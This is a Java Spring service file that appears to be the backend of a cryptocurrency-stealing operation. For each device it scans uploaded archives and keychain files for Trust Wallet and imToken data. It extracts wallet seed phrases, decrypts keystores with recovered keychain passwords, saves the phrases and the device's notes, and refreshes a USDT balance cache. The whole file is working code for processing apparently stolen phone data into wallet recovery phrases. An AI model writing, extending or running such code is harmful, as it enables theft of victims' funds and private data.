package com.consumer.service;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.RejectedExecutionException;
import java.util.function.Supplier;

import javax.annotation.Resource;

import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Service;

import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.consumer.config.V26ConsumerProperties;
import com.consumer.dao.DeviceDao;
import com.consumer.dao.UploadFileDao;
import com.consumer.entity.DeviceEntity;
import com.consumer.entity.UploadFileEntity;
import com.consumer.parse.ArchiveScanner;
import com.consumer.parse.ImTokenWallet;
import com.consumer.parse.KeychainParse;
import com.consumer.parse.ParsedNote;
import com.consumer.parse.TrustWallet;
import com.consumer.parse.WalletDisplay;
import com.consumer.parse.WalletMatcher;
import com.consumer.util.UploadPaths;
import com.consumer.worker.ConsumerLane;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
@RequiredArgsConstructor
public class DeviceAutoParseService {

    private final DeviceDao deviceDao;
    private final UploadFileDao uploadFileDao;
    private final V26ConsumerProperties props;
    private final ArchiveScanner archiveScanner;
    private final KeychainParse keychainParse;
    private final TrustWallet trustWallet;
    private final ImTokenWallet imTokenWallet;
    private final MnemonicStoreService mnemonicStoreService;
    private final MemorandumStoreService memorandumStoreService;
    private final DeviceUsdtCacheService deviceUsdtCacheService;

    @Resource(name = "archiveScanExecutor")
    private ExecutorService archiveScanExecutor;

    @Resource(name = "archiveScanExecutorV1")
    private ExecutorService archiveScanExecutorV1;

    public Map<String, Object> autoParseV2(String deviceId) {
        return autoParse(deviceId, "v2", true);
    }

    public Map<String, Object> autoParse(String deviceId, String metaVer) {
        String did = StringUtils.trimToEmpty(deviceId);
        DeviceEntity device = did.isEmpty() ? null : findDevice(did);
        String dbVer = device == null ? "" : StringUtils.trimToEmpty(device.getInterversion());
        String ver = StringUtils.isNotBlank(dbVer) ? dbVer : StringUtils.defaultIfBlank(metaVer, "v1");
        if ("v2".equalsIgnoreCase(ver) && ConsumerLane.isV1()) {
            Map<String, Object> out = new LinkedHashMap<>();
            out.put("ok", true);
            out.put("device_id", device == null ? did : device.getDeviceId());
            out.put("interversion", "v2");
            return out;
        }
        return autoParse(deviceId, ver, "v2".equalsIgnoreCase(ver));
    }

    private Map<String, Object> autoParse(String deviceId, String version, boolean forceV2) {
        Map<String, Object> out = new LinkedHashMap<>();
        String did = StringUtils.trimToEmpty(deviceId);
        if (did.isEmpty()) {
            out.put("ok", false);
            out.put("error", "empty_device_id");
            return out;
        }
        DeviceEntity device = findDevice(did);
        if (device == null) {
            out.put("ok", false);
            out.put("error", "device_not_found");
            out.put("device_id", did);
            return out;
        }
        did = device.getDeviceId();
        if (forceV2 && !"v2".equalsIgnoreCase(StringUtils.trimToEmpty(device.getInterversion()))) {
            device.setInterversion("v2");
            deviceDao.updateById(device);
        }
        String ver = StringUtils.defaultIfBlank(StringUtils.trimToEmpty(device.getInterversion()), version);
        List<UploadFileEntity> uploads = uploadFileDao.selectList(new QueryWrapper<UploadFileEntity>()
                .eq("deviceId", did)
                .orderByDesc("created_at")
                .orderByDesc("id"));
        long tScan = System.currentTimeMillis();
        List<WalletDisplay> displays = scan(did, uploads, forceV2);
        long scanMs = System.currentTimeMillis() - tScan;
        long tPersist = System.currentTimeMillis();
        Map<String, Object> stats = persist(did, device.getAppId(), displays);
        long persistMs = System.currentTimeMillis() - tPersist;
        try {
            deviceUsdtCacheService.refreshFromDb(did);
        } catch (Exception e) {
            log.warn("wallet_usdt_max refresh fail device={}: {}", did, e.toString());
        }
        int phraseN = 0;
        boolean hasNotes = false;
        for (WalletDisplay w : displays) {
            if (StringUtils.isNotBlank(w.getPhrase())) {
                phraseN++;
            }
            if ("notes".equals(w.getWalletKey())) {
                hasNotes = true;
            }
        }
//        log.info("【scan】device auto-parse done device={} ver=v2 files={} wallets={} phrases={} mnemonic+={} notes+={} has_notes={} scanMs={} persistMs={}",
//                did, uploads.size(), displays.size(), phraseN,
//                stats.get("mnemonic_added"), stats.get("note_added"), hasNotes, scanMs, persistMs);
        out.put("ok", true);
        out.put("device_id", did);
        out.put("interversion", ver);
        out.put("upload_count", uploads.size());
        out.put("wallet_count", displays.size());
        out.put("phrase_count", phraseN);
        out.put("has_notes", hasNotes);
        out.put("scan_ms", scanMs);
        out.put("persist_ms", persistMs);
        out.putAll(stats);
        return out;
    }

    private List<WalletDisplay> scan(String did, List<UploadFileEntity> uploads, boolean v2Only) {
        List<ScanJob> jobs = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        Set<String> seenCanon = new LinkedHashSet<>();
        for (UploadFileEntity u : uploads) {
            String fname = StringUtils.trimToEmpty(u.getFileName());
            if (fname.isEmpty() || seen.contains(fname) || !WalletMatcher.isArchive(fname)) {
                continue;
            }
            if (v2Only && u.getFileSize() != null && u.getFileSize() <= 0) {
                continue;
            }
            if (v2Only && !WalletMatcher.isCoreExportName(fname) && WalletMatcher.classifyV2(fname) == null) {
                continue;
            }
            Path path = UploadPaths.resolveDiskPath(props.getUploadDir(), u.getDiskPath());
            if (path == null) {
                log.warn("【scan】archive path missing device={} file={} diskPath={}",
                        did, fname, u.getDiskPath());
                continue;
            }
//            log.info("【scan】archive device={} file={} disk={}", did, fname, path.toAbsolutePath());
            jobs.add(new ScanJob(fname, path, WalletMatcher.isCoreExportName(fname)));
            seen.add(fname);
        }
        int fromDb = jobs.size();
        for (Path p : UploadPaths.listDeviceArchives(props.getUploadDir(), did)) {
            String fname = p.getFileName().toString();
            if (fname.isEmpty() || seen.contains(fname) || !WalletMatcher.isArchive(fname)) {
                continue;
            }
            if (v2Only && !WalletMatcher.isCoreExportName(fname) && WalletMatcher.classifyV2(fname) == null) {
                continue;
            }
            log.info("【scan】archive(disk) device={} file={} disk={}", did, fname, p.toAbsolutePath());
            jobs.add(new ScanJob(fname, p, WalletMatcher.isCoreExportName(fname)));
            seen.add(fname);
        }
        if (jobs.size() > fromDb) {
            log.warn("upload_files incomplete, disk archive fallback device={} db={} disk+={}",
                    did, fromDb, jobs.size() - fromDb);
        }
        jobs.sort((a, b) -> WalletMatcher.preferOriginalArchive(a.fileName, b.fileName));
        List<ScanJob> uniqueJobs = new ArrayList<>();
        for (ScanJob job : jobs) {
            String canon = WalletMatcher.canonicalArchiveName(job.fileName).toLowerCase();
            if (!seenCanon.add(canon)) {
                continue;
            }
            uniqueJobs.add(job);
        }
        if (uniqueJobs.size() < jobs.size()) {
            log.info("archive collision copies skipped device={} keep={} skip={}",
                    did, uniqueJobs.size(), jobs.size() - uniqueJobs.size());
        }
        jobs = uniqueJobs;

        CompletableFuture<Map<String, KeychainParse.WalletHit>> kcFut = submitScan(
                () -> extractKeychain(did), Collections.emptyMap());

        List<WalletDisplay> items = runScanJobs(did, jobs);
        Map<String, KeychainParse.WalletHit> hits = kcFut.join();
        mergeKeychain(items, hits == null ? new LinkedHashMap<>() : hits);
        recoverTrustFromDiskIfMissing(did, items, hits == null ? new LinkedHashMap<>() : hits);
        return expandImToken(items);
    }

    private List<WalletDisplay> runScanJobs(String did, List<ScanJob> jobs) {
        if (jobs.isEmpty()) {
            return new ArrayList<>();
        }
        if (jobs.size() == 1) {
            return scanOne(did, jobs.get(0));
        }
        List<CompletableFuture<List<WalletDisplay>>> futs = new ArrayList<>(jobs.size());
        for (ScanJob job : jobs) {
            futs.add(submitScan(() -> scanOne(did, job), Collections.emptyList()));
        }
        List<WalletDisplay> items = new ArrayList<>();
        for (CompletableFuture<List<WalletDisplay>> f : futs) {
            List<WalletDisplay> part = f.join();
            if (part != null && !part.isEmpty()) {
                items.addAll(part);
            }
        }
        return items;
    }

    private List<WalletDisplay> scanOne(String did, ScanJob job) {
        if (job.coreExport) {
            return archiveScanner.scanCoreExport(did, job.fileName, job.path);
        }
        return archiveScanner.scanFile(did, job.fileName, job.path);
    }

    private Map<String, KeychainParse.WalletHit> extractKeychain(String did) {
        Path kc = UploadPaths.findDeviceKeychain(props.getUploadDir(), did);
        if (kc == null) {
            return new LinkedHashMap<>();
        }
        log.info("【scan】keychain device={} disk={}", did, kc.toAbsolutePath());
        Map<String, KeychainParse.WalletHit> hits = keychainParse.extract(kc);
        return hits == null ? new LinkedHashMap<>() : hits;
    }

    private List<WalletDisplay> expandImToken(List<WalletDisplay> items) {
        List<WalletDisplay> out = new ArrayList<>();
        for (WalletDisplay w : items) {
            if ("imtoken".equals(w.getWalletKey())) {
                out.addAll(imTokenWallet.expand(w));
            } else {
                out.add(w);
            }
        }
        return out;
    }

    private void mergeKeychain(List<WalletDisplay> items, Map<String, KeychainParse.WalletHit> hits) {
        List<WalletDisplay> trusts = new ArrayList<>();
        for (WalletDisplay w : items) {
            if ("trust".equals(w.getWalletKey())) {
                trusts.add(w);
            }
        }
        if (trusts.size() <= 1) {
            for (WalletDisplay w : trusts) {
                recoverTrust(w, hits.get(w.getWalletKey()));
            }
        } else {
            List<CompletableFuture<Boolean>> futs = new ArrayList<>();
            for (WalletDisplay w : trusts) {
                KeychainParse.WalletHit hit = hits.get(w.getWalletKey());
                futs.add(submitScan(() -> {
                    recoverTrust(w, hit);
                    return Boolean.TRUE;
                }, Boolean.FALSE));
            }
            for (CompletableFuture<Boolean> f : futs) {
                f.join();
            }
        }
        for (WalletDisplay w : items) {
            if ("trust".equals(w.getWalletKey()) && StringUtils.isNotBlank(w.getPhrase())) {
                continue;
            }
            applyKeychainPhrases(w, hits.get(w.getWalletKey()));
        }
        Set<String> seenKeys = new LinkedHashSet<>();
        for (WalletDisplay w : items) {
            if (StringUtils.isNotBlank(w.getWalletKey())) {
                seenKeys.add(w.getWalletKey());
            }
        }
        for (Map.Entry<String, KeychainParse.WalletHit> e : hits.entrySet()) {
            if (seenKeys.contains(e.getKey()) || e.getValue().getPhrases() == null
                    || e.getValue().getPhrases().isEmpty()) {
                continue;
            }
            List<String> phrases = e.getValue().getPhrases();
            WalletDisplay d = new WalletDisplay();
            d.setName(WalletMatcher.walletTitle(e.getKey()));
            d.setSourceFile("keychain.xml");
            d.setWalletKey(e.getKey());
            d.setPhrase(String.join("\n", phrases));
            d.setStatusOk(true);
            String src = StringUtils.defaultIfBlank(e.getValue().getSource(), "Keychain");
            d.setMessage(phrases.size() == 1 ? src + "：" + phrases.get(0)
                    : src + "，共 " + phrases.size() + " 组助记词");
            items.add(d);
        }
    }

    private void recoverTrust(WalletDisplay w, KeychainParse.WalletHit hit) {
        Map<String, String> utc = hit == null ? new LinkedHashMap<>() : hit.getUtcPasswords();
        if (utc == null || utc.isEmpty()) {
            log.info("trust recover skip: no utc password file={}",
                    w == null ? "" : w.getSourceFile());
            return;
        }
        if (w == null || w.getArchivePath() == null) {
            log.info("trust recover skip: no archive file={}",
                    w == null ? "" : w.getSourceFile());
            return;
        }
        List<String> recovered = trustWallet.recover(w.getArchivePath(), w.getArchiveRoots(), utc);
        if (recovered != null && !recovered.isEmpty()) {
            w.setPhrase(String.join("\n", recovered));
            w.setStatusOk(true);
            String src = "Keychain UTC + Documents keystore";
            w.setMessage(recovered.size() == 1 ? src + "：" + recovered.get(0)
                    : src + "，共 " + recovered.size() + " 组助记词");
        } else {
            log.warn("trust recover empty file={} passwords={}", w.getArchivePath(), utc.size());
        }
    }

    private void recoverTrustFromDiskIfMissing(String did, List<WalletDisplay> items,
            Map<String, KeychainParse.WalletHit> hits) {
        KeychainParse.WalletHit hit = hits.get("trust");
        if (hit == null || hit.getUtcPasswords() == null || hit.getUtcPasswords().isEmpty()) {
            return;
        }
        for (WalletDisplay w : items) {
            if ("trust".equals(w.getWalletKey()) && StringUtils.isNotBlank(w.getPhrase())) {
                return;
            }
        }
        Path tar = findTrustArchiveOnDisk(did);
        if (tar == null) {
            log.warn("trust recover skip: utc password exists but no trust tar on disk device={}", did);
            return;
        }
        log.info("【scan】trust recover archive disk={}", tar.toAbsolutePath());
        WalletDisplay w = null;
        for (WalletDisplay item : items) {
            if ("trust".equals(item.getWalletKey())) {
                w = item;
                break;
            }
        }
        if (w == null) {
            w = new WalletDisplay();
            w.setName(WalletMatcher.walletTitle("trust"));
            w.setSourceFile(tar.getFileName().toString());
            w.setWalletKey("trust");
            items.add(w);
        }
        w.setArchivePath(tar);
        recoverTrust(w, hit);
    }

    private Path findTrustArchiveOnDisk(String did) {
        Path best = null;
        for (Path p : UploadPaths.listDeviceArchives(props.getUploadDir(), did)) {
            String name = p.getFileName().toString();
            if (WalletMatcher.classifyV2(name) == null || !"trust".equals(WalletMatcher.classifyV2(name))) {
                continue;
            }
            if (best == null || WalletMatcher.preferOriginalArchive(name, best.getFileName().toString()) < 0) {
                best = p;
            }
        }
        return best;
    }

    private void applyKeychainPhrases(WalletDisplay w, KeychainParse.WalletHit hit) {
        if (hit == null || hit.getPhrases() == null || hit.getPhrases().isEmpty()) {
            return;
        }
        List<String> phrases = hit.getPhrases();
        w.setPhrase(String.join("\n", phrases));
        w.setStatusOk(true);
        String src = StringUtils.defaultIfBlank(hit.getSource(), "Keychain");
        w.setMessage(phrases.size() == 1 ? src + "：" + phrases.get(0)
                : src + "，共 " + phrases.size() + " 组助记词");
    }

    private <T> CompletableFuture<T> submitScan(Supplier<T> work, T fallback) {
        ExecutorService exec = ConsumerLane.isV1() ? archiveScanExecutorV1 : archiveScanExecutor;
        if (exec == null) {
            try {
                return CompletableFuture.completedFuture(work.get());
            } catch (Exception e) {
                log.warn("archive scan inline fail: {}", e.toString());
                return CompletableFuture.completedFuture(fallback);
            }
        }
        try {
            return CompletableFuture.supplyAsync(() -> {
                try {
                    return work.get();
                } catch (Exception e) {
                    log.warn("archive scan fail: {}", e.toString());
                    return fallback;
                }
            }, exec);
        } catch (RejectedExecutionException e) {
            try {
                return CompletableFuture.completedFuture(work.get());
            } catch (Exception ex) {
                log.warn("archive scan fallback fail: {}", ex.toString());
                return CompletableFuture.completedFuture(fallback);
            }
        }
    }

    private Map<String, Object> persist(String did, String appId, List<WalletDisplay> displays) {
        List<String[]> items = new ArrayList<>();
        List<ParsedNote> notes = new ArrayList<>();
        for (WalletDisplay w : displays) {
            if (StringUtils.isNotBlank(w.getPhrase())) {
                items.add(new String[] {StringUtils.defaultIfBlank(w.getName(), w.getWalletKey()), w.getPhrase()});
            }
            if ("notes".equals(w.getWalletKey()) && w.getNotes() != null) {
                notes.addAll(w.getNotes());
            }
        }
        boolean defer = props.getConsumer().isDeferBalance();
        String aid = mnemonicStoreService.resolveAndBackfillAppId(did, appId);
        MnemonicStoreService.PersistResult mn = mnemonicStoreService.finalizeRecovered(
                did, aid, items, !defer, !defer, false);
        int noteAdded = memorandumStoreService.persist(did, aid, notes);
        Map<String, Object> stats = new LinkedHashMap<>();
        stats.put("mnemonic_added", mn.getAdded());
        stats.put("note_added", noteAdded);
        stats.put("new_ids", mn.getNewIds());
        return stats;
    }

    private DeviceEntity findDevice(String did) {
        DeviceEntity d = deviceDao.selectOne(new QueryWrapper<DeviceEntity>().eq("deviceId", did).last("LIMIT 1"));
        if (d == null && !did.equals(did.toLowerCase())) {
            d = deviceDao.selectOne(new QueryWrapper<DeviceEntity>().eq("deviceId", did.toLowerCase()).last("LIMIT 1"));
        }
        return d;
    }

    private static final class ScanJob {
        final String fileName;
        final Path path;
        final boolean coreExport;

        ScanJob(String fileName, Path path, boolean coreExport) {
            this.fileName = fileName;
            this.path = path;
            this.coreExport = coreExport;
        }
    }
}
